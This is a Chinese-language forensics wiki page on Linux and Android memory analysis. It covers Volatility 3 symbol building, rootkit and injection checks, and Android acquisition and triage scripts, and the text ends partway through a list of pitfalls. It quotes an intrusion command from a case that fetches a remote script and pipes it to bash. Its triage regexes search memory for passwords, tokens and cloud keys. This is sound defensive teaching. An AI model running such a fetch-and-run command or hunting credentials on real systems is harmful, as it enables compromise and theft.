---
title: "Linux 与 Android 内存取证"
slug: "memory-artifact-linux-android"
canonical: "https://www.digiforensics.cn/wiki/memory-artifact-linux-android"
license: "CC-BY-SA-4.0"
author: "DigiForensics"
updated_at: "2026-10-09T12:51:50+08:00"
source_url: null
references: ["https://creativecommons.org/licenses/by-sa/4.0/deed.zh-hans"]
source_type: "wiki-sync"
category: "memory"
space: "内存与专项取证"
node_path: ["内存工件"]
---

# Linux 与 Android 内存取证

<a id="section-1"></a>

## 一、概述

Linux 内存取证在技术上比 Windows 更开放——没有卷级加密，`/proc` 直接暴露大量运行时信息。

但困难不在采集，而在**符号**。

Volatility 3 分析 Linux 需要与目标内核精确匹配的 ISF，这件事**无法自动完成**。Windows 侧可以按 PDB GUID 从微软符号服务器自动下载，Linux 做不到。各发行版与自定义内核都会改动内核，**同一个版本号的二进制也未必相同**。符号必须自行构建（`dwarf2json` 或 `btf2json`）。这一步没做，后面所有插件都跑不起来。

Android 是另一个独立子问题：内核是 Linux，用户态却是 ART 而非标准 libc 栈。匿名可执行映射、ART 堆、注入框架痕迹都有自己的判据，采集门槛（root、SELinux）也完全不同。

这一步落在**分析定性环节**，是 memory 板块里非 Windows 平台的落点。采集已经由[内存采集方法](../memory-acquire/memory-acquire-memory-acquisition-methods.md)完成，要解决的是符号怎么备、镜像怎么读、结果怎么判。它与 Windows 侧是互补而非替代——判断一台 Linux/Android 机器上发生了什么，通常要拿 Windows 侧那套判据（父子关系、命令行、连接归属）加上 Linux/Android 特有的判据（TTY 挂钩、命名空间、ART 堆）。

可用的对象与关键点：

| 对象 | 形态 | 关键点 |
|---|---|---|
| 符号来源 | BTF（`btf2json`，用 `vmlinuz`）/ DWARF（`dwarf2json`，需调试包） | 必须与目标内核**精确**匹配 |
| 内核结构 | `task_struct`、`files_struct`、`vm_area_struct` | 插件的解析基础 |
| 命令历史 | `linux.bash` 的内存副本 | **磁盘文件被删也不影响** |
| 环境变量 | `linux.envars` | 常含 API Key 与数据库口令 |
| TTY 输入 | TTY 驱动层输入缓冲 | 键盘记录器必须挂钩 TTY 层 |
| 命名空间 | `/proc/<pid>/ns/*` 的链接目标 | 容器逃逸与横向移动的判据 |
| Android 侧 | ART 堆、匿名可执行映射、`/data/app` 私有目录 | 用户态不是标准 libc 栈 |

第三到第六行是 Linux 特有的优势项，其中 `linux.bash` 的价值最高：**磁盘上的历史被删了，内存里的那份还在**。

据此能回答的是这些：目标 Linux 上跑着哪些进程、执行过哪些命令、进程环境变量里有什么、是否有 rootkit 迹象（未挂载的文件系统、隐藏进程、TTY 钩子）、容器有没有命名空间穿越痕迹、Android 上有没有注入框架或监控应用的运行时痕迹。

回答不了的是这些。符号不匹配时不是"结论少一点"，是全部结论作废。对已锁定或已重启的 Android 设备，明文在内存里就是密文块，这一项无解。内存里取不到的（已换出页、已释放内存），回落盘侧的工件地图重找一遍。

往下读之前，先确认你已经掌握：Linux 内核符号与 BTF/DWARF 的基本概念、`/proc` 虚拟文件系统的结构、Android 的 root 与 SELinux 机制、以及 Volatility 的基本操作。符号构建是这一主题最大的前置工作，建议先看[Windows 内存 Profile 机制](../memory-acquire/memory-acquire-windows-profile.md)理解符号层在整条链路中的位置，再看[proc 虚拟文件系统取证](../../computer/computer-shell/computer-shell-proc.md)打牢 `/proc` 结构基础。
<a id="section-2"></a>

## 二、核心原理

<a id="section-3"></a>

### 2.1 核心结构与插件对应

```
物理内存
├── 内核动态内存
│   ├── slab / SLUB ← task_struct、mm_struct 从此分配
│   │   └── kmem_cache：每种对象类型一个池 ← rootkit 常用来藏数据
│   └── 内核模块区、内核栈、kmsg 环形日志
└── 用户空间（每进程独立）
    ├── task_struct ← 进程在内核中的"身份证"
    ├── mm_struct   ← 地址空间描述符
    └── VMA 链表    ← 文本段/数据段/堆/栈/匿名映射 ← 注入常在匿名映射
```

| 结构 | 作用 | 插件 |
|---|---|---|
| `task_struct` | PID、状态、地址空间指针、父子关系 | `linux.pslist`、`psaux`、`pstree` |
| **VMA** | 地址空间中一段连续区域 | `linux.proc.Maps`、`linux.malware.malfind` |
| `slab` / `kmem_cache` | 内核对象分配器 | `linux.malware.check_modules`、`hidden_modules` |
| `kmsg` | 内核环形日志（`dmesg` 数据源） | `linux.kmsg` |

**`/proc/kcore` 的意义**：它把物理内存按 section 暴露为 ELF 视图，**section 划分对应物理地址区间**。

这正是 LiME 用 `format=lime` 记录地址范围的原因——分析工具需要"文件偏移 → 物理地址"的映射才能正确解析结构。

<a id="section-4"></a>

### 2.2 Linux 特有工件

| 工件 | 内容 | 独特性 | 插件 |
|---|---|---|---|
| **bash 历史** | 历史缓冲区，**含时间戳** | 磁盘文件删了也能从内存取回 | `linux.bash` |
| **环境变量** | 进程环境 | 常直接带密钥与内网地址 | `linux.envars` |
| **TTY 事件** | 终端输入的按键 | **Windows 无对等物** | `linux.malware.tty_check` |
| **打开的文件** | 文件描述符指向 | 能看到已 unlink 但仍打开的句柄 | `linux.lsof` |
| **内核日志** | `dmesg` 缓冲内容 | 模块加载、异常 | `linux.kmsg` |
| **挂载点** | 挂载表，含网络文件系统 | 反映运行期的挂载关系 | `linux.mountinfo` |

> **`linux.bash` 的价值被严重低估**。`/root/.bash_history` 被清空是入侵案的常见反取证手段，但 **bash 进程内存中的历史缓冲区仍保留着这些命令**——**包括清除命令本身**。
>
> 注意：`bash` 记录时间戳的前提是 `HISTFILE` 设置了时间格式（如 `%F`），**否则不记录时间**。所以有输出不代表每条都有时间戳。

<a id="section-5"></a>

### 2.3 rootkit 检测的三个层次

| 层次 | 手法 | 检测插件 | 局限 |
|---|---|---|---|
| **一、用户态** | 替换/劫持 `ls`、`ps`、`ss`、`netstat`、`top` | `linux.lsof`（看实际加载了什么） | 需与发行版哈希基线比对 |
| **二、内核模块** | 加载隐藏 `.ko`，钩子函数 | `check_modules`、`hidden_modules` | 若 sysfs 被篡改则失效 |
| **三、内核级** | 改系统调用表/IDT，**不加载模块** | `check_syscall`、`check_idt`、`tty_check` | 隐蔽性最高 |

> `check_modules` 与 `hidden_modules` 的区别：前者比对"内存中的模块信息"与"sysfs 中可读到的信息"——若 rootkit 篡改 `/sys/module` 隐藏了模块，两者会不一致。后者专门寻找"在内存里有完整结构、但未出现在模块列表"的模块。
>
> **TTY 检查是 Linux 独有的检测面**。键盘记录器**必须**挂钩 TTY 层的输入处理函数——这是它的工作原理决定的。`tty_check` 正是检查这些函数指针是否指向预期模块之外的地方。

<a id="section-6"></a>

### 2.4 符号获取：必须自建

Linux 内核的调试信息（`.debug` 段或 BTF）**不在任何中心服务器上**，随发行版 `-dbgsym` 包分发或需自行编译。

| 工具 | 语言 | 输入 | 依赖 | 适用 |
|---|---|---|---|---|
| `btf2json` | Rust（独立工具） | `--btf <BTF 文件>` + `--map <符号表>` | **不需要完整调试内核** | **现代内核推荐** |
| `dwarf2json` | Go | `--elf <vmlinux>` | 完整 DWARF | 有发行版 dbgsym 包时 |

> ⚠️ **不要把两者混用**：`--btf` / `--map` 是 **`btf2json` 的参数**；`dwarf2json` 只有 `--elf` / `--elf-symbols` / `--elf-types` / `--system-map`，**给它传 `--btf` 会直接报错**。

**关键差异**：Windows 是"事后联网取"，Linux 是**"事前在目标机上准备"**。

且 **Linux 符号文件名不影响匹配**——内核 banner 编码在 ISF 内部，框架靠它匹配；这一点与 Windows（靠 GUID）不同。

<a id="section-7"></a>

### 2.5 Android 特有：ART 运行时与注入迹象

`/proc/<pid>/maps` 关键映射判读：

| 映射名 | 判读 |
|---|---|
| `[anon:dalvik-main space (region space)]` | **正常**，ART 主堆，每个 Android 进程都有 |
| `[anon:dalvik-LinearAlloc]` / `[anon:dalvik-indirect ref table]` | 正常 |
| `[anon:dalvik-jit-code-cache]` | **正常但需注意**：可执行，是合法 JIT 代码 |
| `[anon:scudo:primary]` | 正常（内存分配器） |
| **`/data/local/tmp/*.so`** | **⚠️ 高度可疑**，调试框架常驻位置 |
| `/data/data/<pkg>/files/*.so` | 可疑（除非该应用正常行为） |
| **匿名可执行页（无对应文件）** | **⚠️ 强注入信号** |

> **判读核心**：`dalvik-*` 映射**不是**注入迹象——**每个 Android 进程都有**。把 `dalvik-main space` 报成"隐藏代码"是常见误判。
>
> **真正的注入迹象**：① 匿名可执行映射且无对应文件；② `/data/local/tmp/` 下的 `.so`；③ 内存中的注入框架字符串（如 `frida-agent`、`gum-js-loop`，见[第七章](#section-49)）；④ 应用主类加载路径与包名不符。在涉案设备上发现 Frida 痕迹，意味着要么设备被用于攻击，要么分析环境被污染——两种情况都要写入报告。

<a id="section-8"></a>

### 2.6 iOS 内存取证的现实

iOS 的结论先行：现代 iOS 上在线内存采集不可行。

| 障碍 | 说明 |
|---|---|
| **必须越狱** | 未越狱设备无法获得内核级访问 |
| **公开方案已失效** | 该领域曾出现的公开方案在现代 iOS 上已失效 |
| **`idevicesyslog` 不是内存** | **它只是系统日志**（等价于 `log stream`） |
| **Apple 的立场** | 不向第三方开放内核内存访问，仅企业 MDM 有正式通道 |

**易混淆概念澄清**：很多资料把 `idevicesyslog`、Crash 日志、`ipsw` 提取列为"iOS 内存取证"，**这些都不是**。

前者是日志，中间是崩溃转储（仅崩溃瞬间的少量内容），后者是固件镜像。真正的内存镜像在 iOS 上没有可行的合法采集路径。

**实务建议**：iOS 案件的内存维度**应作为"证据局限"明确写入报告**，而不是勉强用日志冒充内存证据。

---

<a id="section-9"></a>

## 三、操作步骤

<a id="section-10"></a>

### 3.1 第 1 步：符号准备（Linux 侧的前置工作）

```bash
# 1) 确认目标内核版本（采集时就应记录）
uname -r                                    # → 5.10.134-android12-9

# 2) 收集符号生成所需的输入（在目标机或同构机器上）
ls -la /boot/vmlinuz-$(uname -r) /boot/System.map-$(uname -r)

# 3) 检查内核是否含 BTF（决定用哪条路线）
#    现代内核可直接从 /sys/kernel/btf/vmlinux 取
ls -la /sys/kernel/btf/vmlinux 2>/dev/null || \
  objcopy -O binary --only-section=.BTF /boot/vmlinuz-$(uname -r) /tmp/vmlinux.btf
```

路线 A（推荐）：`btf2json`——只需 `vmlinuz` 的 BTF + `System.map`，不需要完整调试内核；路线 B：`dwarf2json`——需要带 DWARF 的 `vmlinux`。 完整构建命令见[第七章](#section-49)。

**确认符号可用**：

```bash
python3 vol.py -f DigiForensics-mem.raw -s /opt/isf linux.pslist
# 正常输出应含 init、内核线程、用户进程；报符号不匹配即 ISF 无效

# 看框架实际加载了哪个符号文件
python3 vol.py -f DigiForensics-mem.raw -s /opt/isf isfinfo
```

<a id="section-11"></a>

### 3.2 第 2 步：进程、痕迹、网络与 rootkit

```bash
V="python3 vol.py -f DigiForensics-mem.raw -s /opt/isf"

$V linux.pslist        # 进程列表
$V linux.pstree        # 父子关系
$V linux.psaux         # 含命令行、环境、父进程
$V linux.proc.Maps     # 内存映射（识别匿名可执行区）
$V linux.bash          # bash 历史（含时间戳）
$V linux.envars        # 环境变量（常含密钥）
$V linux.kmsg          # 内核日志
$V linux.lsof          # 打开的文件

# 注意：Linux 没有 netscan 插件
$V linux.sockstat       # 套接字统计（当前活动）
$V linux.sockscan       # 套接字扫描（内核池扫描）
$V linux.malware.tty_check
```

**进程摘链检测**（与 Windows 同思路，见[第 05 篇](../memory-analyze/memory-analyze-process-and-injection-detection.md)）：

```bash
$V linux.pslist | awk '{print $2}' | sort -u > /tmp/pslist_pids.txt
$V linux.psscan | awk '{print $2}' | sort -u > /tmp/psscan_pids.txt
comm -13 /tmp/pslist_pids.txt /tmp/psscan_pids.txt    # psscan 有、pslist 无
```

> **与 Windows 的重要差异**：`linux.sockscan` 也是**扫描**内核池得到，**同样存在 stale data 问题**。判读原则与[第 06 篇](memory-artifact-memory-network-artifacts.md)一致——**扫描结果必须交叉验证**。
>
> ⚠️ **命名规范**：`linux.malware.*` 是规范名称。顶层 `linux.check_modules`、`linux.tty_check`、`linux.hidden_modules` 等旧名虽仍可用，但**已标记弃用并设定了移除日期**，脚本里应固定用规范名。

<a id="section-12"></a>

### 3.3 第 3 步：Android 采集与初筛

**完整采集脚本**：

```bash
cat > /work/android-acquire.sh <<'SCRIPT'
#!/bin/bash
# Android 内存采集（需 root）
set -e
OUT="${1:-/sdcard/DigiForensics-mem.raw}"
LOG="/sdcard/acq-log.txt"

echo "=== Android 内存采集 $(date -Iseconds) ===" > "$LOG"
getprop ro.product.model           >> "$LOG" 2>&1
getprop ro.build.version.release   >> "$LOG" 2>&1
getprop ro.build.fingerprint       >> "$LOG" 2>&1
uname -a                           >> "$LOG" 2>&1
getenforce                         >> "$LOG" 2>&1   # SELinux 状态（关键）
grep -E 'MemTotal|MemAvailable' /proc/meminfo >> "$LOG" 2>&1
ps -A -o PID,PPID,USER,NAME        >> "$LOG" 2>&1

/data/local/tmp/avml "$OUT"        >> "$LOG" 2>&1
ls -l "$OUT"                       >> "$LOG" 2>&1
echo "=== 完成 $(date -Iseconds) ===" >> "$LOG"
cat "$LOG"
SCRIPT

adb push /work/android-acquire.sh /data/local/tmp/
adb shell su -c "setenforce 0"          # 放行（记录此状态变更！）
adb shell su -c "chmod 755 /data/local/tmp/android-acquire.sh"
adb shell su -c "/data/local/tmp/android-acquire.sh /sdcard/DigiForensics-mem.raw"
adb pull /sdcard/DigiForensics-mem.raw
adb shell su -c "rm -f /sdcard/DigiForensics-mem.raw /data/local/tmp/avml /data/local/tmp/android-acquire.sh"
```

**Android 初筛脚本**（> ⚠️ 手机镜像同样动辄数 GB，**`strings` 一次读全会 OOM**——复用[第 06 篇](memory-artifact-memory-network-artifacts.md)的 `scan_img` 分块函数，或对单进程用 `windows.memmap` 等价方式先切出可疑进程内存）：

```bash
cat > /work/android-triage.sh <<'SCRIPT'
#!/bin/bash
# Android 内存镜像初筛（依赖外部定义的 scan_img <正则> <输出> [最小串长]）
IMG="${1:-DigiForensics-mem.raw}"
scan_img 'frida-agent|gum-js-loop|gum-js-bridge|re\.frida'            /tmp/t1.txt
scan_img '/data/local/tmp/.*\.so'                                      /tmp/t2.txt 8
scan_img 'password=|passwd=|jdbc:|mysql://|postgres(ql)?://'          /tmp/t3.txt
scan_img 'api[_-]?key|access[_-]?token|Bearer '                       /tmp/t4.txt
scan_img 'AIza[0-9A-Za-z_-]{35}|AKIA[0-9A-Z]{16}'                     /tmp/t5.txt
scan_img 'magisk|supersu|busybox|xposed|substrate|cydia'             /tmp/t6.txt
cat /tmp/t1.txt /tmp/t2.txt /tmp/t5.txt | head -40   # 注入框架 / 临时 .so / root 框架
grep -hE 'AIza|AKIA' /tmp/t5.txt                      # 云凭据（仅记录，不外传）
SCRIPT
chmod +x /work/android-triage.sh
/work/android-triage.sh DigiForensics-mem.raw
```

<a id="section-13"></a>

### 3.4 第 4 步：ART 映射判读

```bash
$V linux.proc.Maps > /work/maps.txt
# 正常的 ART 映射（每个进程都有，不是异常）
grep -E 'dalvik-main space|dalvik-LinearAlloc|dalvik-indirect ref table' /work/maps.txt | head
# 可疑：临时目录的库
grep -E '/data/local/tmp/' /work/maps.txt
# 匿名可执行映射（注入的强信号）——先排除 ART 合法映射
grep -E '\[anon' /work/maps.txt | grep -viE 'dalvik|scudo|jit-code' | head -20
```

---
<a id="section-14"></a>

## 四、常见陷阱

Linux 与 Android 的困难不在采集而在**解释**：Windows 侧能按 PDB GUID 自动取到符号，Linux 侧必须事前自建；Android 侧满屏 `dalvik-*` 映射，正常与异常在形态上高度相似。

本章按符号、Linux 工件与 rootkit、stale data、Android 判读、阴性表述五组展开。

<a id="section-15"></a>

### 4.1 符号：Linux 侧的硬前置

四条陷阱全在这一组。共同点是：它们都发生在符号还没备好的时候，而此时插件往往不会报"错"，只是给出一片看起来正常的空结果。

<a id="section-16"></a>

#### 陷阱 1：Linux 符号不准备就直接分析

**现象**：拿到 Linux 内存镜像直接跑 `linux.pslist`，报符号不匹配或输出为空，转而认为镜像不可用。

**原因**：1 把 Linux 的困难点说得很直接——技术上比 Windows 更开放，但困难在别处：符号。Volatility 3 分析 Linux 需要**与目标内核精确匹配的 ISF**，而 2.1 的结构表里 `task_struct`、`mm_struct`、VMA 链表的解析全依赖这些结构定义。没有匹配符号，框架连 `task_struct` 的字段偏移都不知道，输出为空是必然的。

**影响**：**把"没有解释器"当成"数据不可用"**。

案例第 1 步整个花在符号构建上（`dwarf2json` 从带 DWARF 的 vmlinux 生成 ISF），第 2 步才拿到正常的进程列表。跳过这一步，64 GB 的服务器镜像就白采了。

**核查**：**符号是分析的前置工作，不是分析的步骤**。

3.1 是完整流程：确认 `uname -r` → 收集 `/boot/vmlinux-$(uname -r)` 与 `System.map-$(uname -r)` → 检查是否有 BTF（`ls -la /sys/kernel/btf/vmlinux`）→ 生成 ISF → 用 `linux.pslist` + `isfinfo` 验证。

**验证标准要具体**：输出里应能看到 `swapper/0/0`、`kthreadd` 这类内核线程，以及至少一个用户进程。

<a id="section-17"></a>

#### 陷阱 2：以为 Linux 符号能自动下载

**现象**：把 Windows 侧的经验套过来，在联网分析机上等框架自动获取 Linux 符号，一直卡住或报下载失败。

**原因**：2.4 的第一句就是事实——Linux 内核的调试信息（`.debug` 段或 BTF）不在任何中心服务器上，随发行版 `-dbgsym` 包分发或需自行编译。1 的对比也很清楚：Windows 侧可按 PDB GUID 自动下载，**Linux 做不到**。2.4 的引文把这个反差总结成一句——Windows 是"事后联网取"，Linux 是"事前在目标机上准备"。

**影响**：**在错误的时间点做准备工作**。

"等拿到镜像再想办法"的思路在 Linux 上直接失效——拿到镜像时，你需要的输入文件（vmlinux、System.map、dbgsym 包）可能已经不在任何地方了。

案例里运维方保留了带 DWARF 的 vmlinux 才使符号构建成为可能，这**不是理所当然的**。

**核查**：**采集时一并准备符号输入文件**（3.1 的第 2 步、陷阱 1 都强调这一点）。对生产服务器，这意味着在**采集的同时**把 `/boot/` 下的相关文件和 dbgsym 包复制出来。

在报告的采集方法章节写明符号输入文件的来源与获取时间——它决定了这份镜像能不能被复核。

<a id="section-18"></a>

#### 陷阱 3：符号文件名对不上就以为符号不匹配

**现象**：把 ISF 命名为 `/opt/isf/linux/mylinux.json`，框架不认；改文件名后好了，于是以为"文件名必须和内核版本号一致"。

**原因**：2.4 的引文明确——Linux 符号文件名不影响匹配，内核 banner 编码在 ISF 内部，框架靠它匹配。这一点与 Windows（靠 GUID）不同。所以 3.1 的 `btf2json` 命令里专门加了 `--banner "$(uname -r)"` 参数——banner 是写进 ISF 内容里的，不是文件名。速查的命令里 ISF 输出为 `/opt/isf/linux/$(uname -r).json` 是为了**人可读**，不是框架的要求。

**影响**：**在错误的层面上排查**。以为问题是文件名，于是反复重命名文件、调整目录结构，而真正的匹配依据（ISF 内部的 banner）与文件名毫无关系。

真正的排查手段是 `isfinfo`——3.1 明确「看框架实际加载了哪个符号文件」。

**核查**：**用 `isfinfo` 确认实际加载了哪一份**，以及它内部记录的 banner 是什么。命名规范（用 `uname -r` 命名）是为了**人可读和避免覆盖**，不是为了匹配。

匹配失败时先确认 banner 是否与 `uname -r` 一致——案例第 1 步输出到 `/opt/isf/linux/5.14.0-427.el9.x86_64.json`，命名规范，但真正让 `linux.pslist` 跑通的是 vmlinux 与内核版本精确对应这一点。

<a id="section-19"></a>

#### 陷阱 4：把 `btf2json` 与 `dwarf2json` 的参数混用

**现象**：给 `dwarf2json` 传 `--btf`，或者给 `btf2json` 传 `--elf`，报未知参数。

**原因**：2.4 的警告框专门讲了这一点——`--btf` / `--map` 是 `btf2json` 的参数；`dwarf2json` 只有 `--elf` / `--elf-symbols` / `--elf-types` / `--system-map`，给它传 `--btf` 会直接报错。两者的差异在 2.4 的表格里：输入、依赖、语言全都不同（`btf2json` 是 Rust 独立工具、只需 BTF + System.map、**不需要完整调试内核**；`dwarf2json` 是 Go、需要完整 DWARF）。

**影响**：**选错路线时才发现输入文件不具备**。

案例第 1 步先 `readelf -S ... | grep -i btf` 确认无 BTF，才决定走 `dwarf2json`——这个前置检查就是为了避免选错路线后才发现没有对应输入。

选错路线的典型后果是：你有一份裁剪过的内核（只有 BTF 没有 DWARF），却按 `dwarf2json` 的思路去找完整 vmlinux，找不到。

**核查**：先查有没有 BTF（`ls -la /sys/kernel/btf/vmlinux`，或 `objcopy` 从 vmlinuz 提取），再选路线。

有 BTF 走 `btf2json`（推荐，依赖少）；无 BTF 但有带 DWARF 的 vmlinux 走 `dwarf2json`；**两者都没有时，符号构建是真正的阻碍**，需要在采集阶段就规划。

<a id="section-20"></a>

### 4.2 Linux 工件与 rootkit 检查

<a id="section-21"></a>

#### 陷阱 5：把 `dalvik-*` 映射报成"隐藏代码"

**现象**：在 Android 进程的 `linux.proc.Maps` 输出里看到大量 `[anon:dalvik-main space (region space)]`、`[anon:dalvik-LinearAlloc]`，报告写"发现大量匿名隐藏代码"。

**原因**：2.5 的判读核心一句话——`dalvik-*` 映射不是注入迹象，每个 Android 进程都有。把 `dalvik-main space` 报成"隐藏代码"是**原文点名的常见误判**。ART 运行时是 Android 的标准 Java 运行时，它的堆、线性分配区、间接引用表、JIT 代码缓存**全部以匿名映射形式存在于每一个应用进程里**。`dalvik-jit-code-cache` 甚至是**可执行的合法 JIT 代码**——它长得像注入代码，但它是运行时的工作机制。

**影响**：**假阳性会淹没真阳性**。

一个正常应用的 dalvik 映射有几十条，把它们全标为可疑之后，`/data/local/tmp/` 下真正可疑的 `.so` 和真正的匿名可执行页就埋在里面了。

而且这类报告在 Android 分析领域非常常见，专业读者一看就知道是套模板。

**核查**：**先排除 ART 合法映射再看剩余部分**。

3.4 的命令给出了标准判读顺序：`grep -E '\[anon' /work/maps.txt | grep -viE 'dalvik|scudo|jit-code'`——排除项必须包含 dalvik、scudo（内存分配器）、jit-code 三类。

2.5 的判读表把"正常但需注意"与"强注入信号"分得很清楚：只有**匿名可执行页（无对应文件）**才是强信号。

<a id="section-22"></a>

#### 陷阱 6：把 `linux.sockscan` 当活动连接

**现象**：`linux.sockscan` 输出里有一个到某外部 IP 的连接，写进报告作为外联证据。

**原因**：3.2 的引文点明——`linux.sockscan` 也是扫描内核池得到的，同样存在 stale data 问题，判读原则与 [第 06 篇](memory-artifact-memory-network-artifacts.md)一致：扫描结果必须交叉验证。这与 Windows 侧 `netscan` 的原理完全相同——扫描能看到已关闭的连接，**代价是把已释放的残留数据报成活跃连接**。

**影响**：案例第 5 步给了标准处置——`sockscan` 里有 `198.51.100.77`、`sockstat` 里 0 条，判读是「该条目可能为池残留，**不能单独作为外联证据**」。

如果没有这个交叉步骤，一条残留数据就会成为报告里唯一的"外联证据"，而它其实什么都不证明。

**核查**：**两个插件都跑并做差集**（3.2 给了 `linux.sockstat` 与 `linux.sockscan` 的对应关系）。

更重要的是——Linux 侧有一个 Windows 侧没有的替代证据：`linux.bash` 里的命令历史。

案例正是这样破局的：`curl -s http://198.51.100.77/ipt.sh | bash` 由命令历史证明，**而非依赖残留的套接字数据**。

案例引文第 ③ 条说得直接——用可靠证据替代不可靠证据，同一个 IP，一个是可验证的命令记录，一个是可能失效的池残留。

<a id="section-23"></a>

#### 陷阱 7：在 Linux 上用 `netscan`

**现象**：照抄 Windows 侧的命令跑 `linux.netscan`，报插件找不到。

**原因**：3.2 的命令里专门标注「**注意：Linux 没有 netscan 插件**」，[第 03 篇](../memory-acquire/memory-acquire-volatility3.md)的警告框也点名了 `linux.netscan` 是**官方发行版中并不存在**的名字。它看起来合理是因为 Windows 侧确实有这个插件——而 Linux 与 Windows 的插件体系是两套独立的命名空间。

**影响**：把插件名不存在误判成"框架不支持 Linux"或"镜像有问题"，并连带错过 Linux 侧真正的对应能力（`linux.sockstat`、`linux.sockscan`、`linux.ip.Addr`、`linux.malware.netfilter`）。

**核查**：Linux 侧用 `linux.sockstat`（当前活动）与 `linux.sockscan`（池扫描），两者交叉验证。速查第 2 节的注释就是这个要点。

**报告里写明用的是哪个插件、覆盖了哪些结构类型**——Linux 与 Windows 的网络工件机制不同，结论适用范围也不同。

<a id="section-24"></a>

#### 陷阱 8：用弃用的顶层插件名写脚本

**现象**：脚本里写 `linux.check_modules`、`linux.tty_check`、`linux.hidden_modules`，在当前版本上能跑但带警告，换版本后找不到。

**原因**：3.2 的警告框给了规范——`linux.malware.*` 是规范名称，顶层 `linux.check_modules` 等旧名虽仍可用，但已标记弃用并设定了移除日期。这与 Windows 侧的 `windows.malware.*` / `windows.registry.*` 是同一套机制（[第 03 篇](../memory-acquire/memory-acquire-volatility3.md)的 deprecation 机制）。"现在能跑"这件事本身带有效期，而这个有效期在插件输出里看不到。

**影响**：脚本在编写时验证通过、交付时环境升级就失效。

而 rootkit 检查这一环在报告里通常是**支撑阴性结论的关键材料**（案例第 5 步的四项检查），脚本失效等于这层证据拿不出来。

**核查**：脚本固定用 `linux.malware.*` 规范名（速查第 3 节全部是规范名：`check_modules` / `hidden_modules` / `modxview` / `check_syscall` / `check_idt` / `check_afinfo` / `tty_check` / `process_spoofing` / `malfind`）。

脚本化之前先 `vol.py -h` 导出可用插件列表存档（3.4 的可复现性记录里有这一步）。

<a id="section-25"></a>

#### 陷阱 9：只查磁盘 `.bash_history`，得出"无命令历史"

**现象**：磁盘上的 `/root/.bash_history` 为空或已被删除，报告写"未发现攻击者的命令执行痕迹"。

**原因**：2.2 把 `linux.bash` 单独拎出来强调，是因为 `/root/.bash_history` 被清空是入侵案的常见反取证手段，但 bash 进程内存中的历史缓冲区仍保留着这些命令，包括清除命令本身。第一章把它列为 Linux 相对 Windows 的独特优势之首，2.2 的表格也专门注明"磁盘文件删了也能从内存取回"。

**影响**：**方向性错误**。磁盘历史为空恰恰是这类攻击的预期结果，用它得出否定结论，等于把攻击者的成功手法当成了你的结论依据。

案例第 3 步是教科书级的处置——磁盘文件 0 字节，内存里完整保留了四条命令，**其中两条正是清除动作本身**（`history -c` 与 `rm -f /root/.bash_history`），构成"**自证反取证**"。

**核查**：`linux.bash` 是恢复被删历史的唯一途径，必须跑。

案例的结论表把"攻击者主动清除 bash 历史"标为"强（**自证反取证**）"——**清除动作本身成为证据**，这是内存取证特有的叙事能力。

<a id="section-26"></a>

#### 陷阱 10：`linux.bash` 有输出就认为每条都带时间戳

**现象**：`linux.bash` 输出里部分行有时间戳、部分行没有，报告统一按"带时间戳的记录"表述。

**原因**：2.2 的引文末尾有一个条件——`bash` 记录时间戳的前提是 `HISTFILE` 设置了时间格式（如 `%F`），否则不记录时间。**有输出不代表每条都有时间戳。** 案例第 3 步的四条命令全部带 `CommandTime`（`2026-02-11 03:17:22` 等），那是**因为该环境的 HISTFILE 设置了时间格式**——这属于环境条件，不是插件的保证。

**影响**：**时间线不完整却被当作完整**。

无时间戳的条目不能参与时间线排序，而它们可能恰恰是关键的初始化命令。报告里"所有命令均带时间戳"这个说法在其它环境下不成立。

**核查**：**逐条检查 `CommandTime` 列是否为空**，空的单独归类。

报告中说明该环境的 `HISTFILE` 时间格式设置（这是从 `linux.envars` 或磁盘侧的 `/root/.bashrc` 能确认的）——**没有这个条件，缺时间戳是环境导致的，不是数据丢失**。

带时间戳的条目才可用于精确排序，无时间戳的用于内容分析。

<a id="section-27"></a>

### 4.3 Android 判读与采集记录

<a id="section-28"></a>

#### 陷阱 11：`/data/local/tmp` 下的 `.so` 判为"应用正常行为"

**现象**：发现某应用进程加载了 `/data/local/tmp/libxxx.so`，认为这是该应用自带的库。

**原因**：2.5 的判读表把 `/data/local/tmp/*.so` 标为「**⚠️ 高度可疑，调试框架常驻位置**」，而 `/data/data/<pkg>/files/*.so` 才是"可疑（除非该应用正常行为）"。`/data/local/tmp` 是 Android 上调试框架（Frida、Xposed 等）的标准驻留位置——普通应用不会把动态库放在这里，因为这个目录对所有应用可读、且在应用卸载时不会被清理。3.4 的命令把它单列一条 `grep -E '/data/local/tmp/'`。

**影响**：**把注入框架的证据判成了正常行为**。而"应用自带的库"这个解释很容易被接受——尤其当该 `.so` 的文件名看起来无害时。

**核查**：**一律视为可疑并进一步分析**——确认映射的进程、该 `.so` 的路径与内容（`scan_img '/data/local/tmp/.*\.so' /tmp/t2.txt 8` 提取上下文）、以及该目录在设备上的文件列表。

2.5 列出的四条真正注入迹象要一起看：① 匿名可执行映射且无对应文件；② `/data/local/tmp/` 下的 `.so`；③ **内存中的注入框架字符串**（`frida-agent`、`gum-js-loop`，3.3 的初筛脚本第一条就是这个）；④ 应用主类加载路径与包名不符。

<a id="section-29"></a>

#### 陷阱 12：在涉案设备上发现 Frida 痕迹，判定设备被用于攻击

**现象**：在目标设备上检出 `frida-agent` 或 `gum-js-loop` 字符串，直接结论"该设备被攻击者用于攻击"。

**原因**：2.5 的引文第 ④ 点给了一个明确的二义性提示——在涉案设备上发现 Frida 痕迹，意味着要么设备被用于攻击，要么分析环境被污染，两种情况都要写入报告。这句提示的分量在于：Frida 痕迹同样会出现在**别人正在调试这台设备**的场景里——安全厂商的评估、自己的前期技术验证、乃至**此前某次取证分析的遗留**（如果分析是在这台设备上做的）。

**影响**：**方向性错误，且涉及第三方责任**。如果实际是"分析环境被污染"，那么**你基于这台设备做出的所有结论都可能被污染过**——这个问题的严重性远大于"发现注入"本身。

**核查**：**两种可能都写进报告**，并给出区分依据——**注入痕迹所在的时间是否早于本次分析**、**是否有其他人对这台设备做过调试的迹象**（adb 连接记录、logcat、文件时间戳）。**时间顺序是关键判据**：若 Frida 痕迹的时间与攻击行为的时间吻合，它更可能是攻击工具；若是近期才出现，更可能是分析活动。

<a id="section-30"></a>

#### 陷阱 13：root 与 SELinux 状态变更不记录

**现象**：为了让 AVML 跑通，`setenforce 0` 之后直接采集，报告的采集方法章节只写"使用 AVML 采集"。

**原因**：3.3 的采集脚本里 `getenforce` 那一行标了"**SELinux 状态（关键）**"，`setenforce 0` 的命令行上也标了"**放行（记录此变更！）**"。

